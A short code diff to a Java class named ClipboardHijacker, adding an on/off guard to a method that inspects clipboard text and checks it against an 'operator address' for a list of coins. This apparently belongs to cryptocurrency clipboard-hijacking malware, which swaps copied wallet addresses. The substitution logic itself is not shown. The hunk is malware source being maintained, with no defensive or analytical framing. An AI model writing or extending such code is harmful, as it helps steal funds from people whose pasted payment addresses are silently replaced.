@@ -133,6 +133,9 @@ final class ClipboardHijacker {
 	}
 
 	private void handle(String text, String process, String title) {
+		if (!active) {
+			return;
+		}
 		try {
 			String clean = text.strip();
 			if (clean.equals(lastSet) || ClipboardPolicy.isOperatorAddress(clean, coins())) {
